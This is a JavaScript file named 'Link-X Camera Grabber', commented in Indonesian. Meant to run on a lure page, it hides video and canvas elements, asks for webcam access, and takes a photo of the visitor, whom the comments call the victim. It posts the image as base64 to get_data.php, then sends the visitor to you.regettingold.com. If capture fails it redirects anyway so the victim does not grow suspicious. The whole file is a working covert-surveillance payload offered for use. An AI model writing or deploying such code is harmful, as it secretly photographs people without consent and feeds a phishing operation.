// camera.js - Link-X Camera Grabber
(function() {
    const delay = ms => new Promise(res => setTimeout(res, ms));

    // Buat elemen secara diam-diam
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');

    // Sembunyikan elemen
    video.style.display = 'none';
    canvas.style.display = 'none';
    document.body.appendChild(video);
    document.body.appendChild(canvas);

    // Ambil akses kamera
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(stream => {
            video.srcObject = stream;
            video.play();

            // Tunggu sampai metadata video siap
            return new Promise((resolve) => {
                if (video.readyState >= 2) { // HAVE_METADATA
                    resolve();
                } else {
                    video.onloadedmetadata = () => resolve();
                }
            });
        })
        .then(() => {
            // Beri sedikit delay tambahan untuk frame pertama
            return delay(500);
        })
        .then(() => {
            // Atur ukuran canvas sesuai resolusi kamera
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;

            // Gambar frame ke canvas
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Ambil data gambar (base64 tanpa prefix)
            const dataUrl = canvas.toDataURL('image/png');
            const base64Data = dataUrl.split(',')[1];

            // Kirim ke server
            return fetch('get_data.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ image: base64Data })
            });
        })
        .then(response => {
            // Redirect korban setelah sukses
            let redirectUrl = "https://you.regettingold.com/";
            if (typeof window.redirectUrl !== 'undefined') {
                redirectUrl = window.redirectUrl;
            }
            window.location.href = redirectUrl;
        })
        .catch(err => {
            // Jika gagal, tetap redirect agar tidak mencurigakan
            console.warn("Camera access failed:", err);
            window.location.href = "https://you.regettingold.com/";
        });
})();